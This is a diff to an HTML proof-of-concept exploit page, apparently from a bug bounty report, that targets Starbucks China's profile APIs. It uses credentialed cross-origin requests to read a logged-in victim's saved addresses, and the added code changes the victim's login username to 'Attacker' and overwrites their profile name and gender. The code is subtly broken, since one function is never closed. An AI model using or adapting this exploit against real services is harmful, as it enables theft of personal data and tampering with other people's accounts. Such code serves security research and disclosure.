@@ -4,6 +4,14 @@
 <meta name="referrer" content="never">
 </head>
 <title>steal the informations</title>
+<div>
+Attention!the loggin userName can be modified only once,click the button.
+<button id="modifyuserName" onclick="modifyUserName()">Modify the loggin name of starbucks's account</button>
+</div>
+<div>
+click the button to modify the profile of victim's account!
+<button id="modifyProfile" onclick="modifyProfile()">modify the Profile of starbucks's account</button>
+</div>
 <div text="steal customer's personal informaiton">
 steal customer's personal address
 <textarea id="customer" style="width: 200px; height: 150px;"></textarea>
@@ -12,6 +20,7 @@ steal customer's personal address
 
      var xmlhttp1 = new XMLHttpRequest()
      var xmlhttp2 = new XMLHttpRequest()
+     var xmlhttp3 = new XMLHttpRequest()
      xmlhttp1.onreadystatechange=function()
 	{
 		if (xmlhttp1.readyState==4 && xmlhttp1.status==200)
@@ -24,6 +33,57 @@ steal customer's personal address
 	xmlhttp1.open("GET","https://profile.starbucks.com.cn/api/Customers/addresses/list",true);
 	xmlhttp1.withCredentials = true;
 	xmlhttp1.send();
+	
+	function modifyUserName(){
+		var data = {};
+		data["userName"] = "Attacker";
+		$.ajax({
+			    url : 'https://profile.starbucks.com.cn/api/account/username',
+			    type : 'PATCH',
+			    dataType:'json',
+			    contentType:'application/json',
+			    data:JSON.stringify(data),
+			    xhrFields: {
+			     withCredentials: true
+			 },
+			    success : function(response, textStatus, jqXhr) {
+				alert("Successfully !Your account's loggin userName have been modified!");
+			    },
+			    error : function(jqXHR, textStatus, errorThrown) {
+				// log the error to the console
+				console.log("The following error occured: " + textStatus, errorThrown);
+			    },
+			    complete : function() {
+				console.log("complete");
+			    }
+        });
+	
+		
+	function modifyProfile(){
+		var data = {};
+		data["firstName"] = "attackerFirstName";
+		data["lastName"] = "attackerlastName";
+		data["gender"] = "Male";
+		$.ajax({
+			    url : 'https://profile.starbucks.com.cn/api/Customers/update/patch',
+			    type : 'POST',
+			    dataType:'json',
+			    contentType:'application/json',
+			    data:JSON.stringify(data),
+			    xhrFields: {
+			     withCredentials: true
+			 },
+			    success : function(response, textStatus, jqXhr) {
+				alert("Successfully !Your account's profile have been modified!");
+			    },
+			    error : function(jqXHR, textStatus, errorThrown) {
+				// log the error to the console
+				console.log("The following error occured: " + textStatus, errorThrown);
+			    },
+			    complete : function() {
+				console.log("complete");
+			    }
+        });
 	
 </script>
 <a href="https://hackerone.com/johnstone">hacker1 johnstone</a>
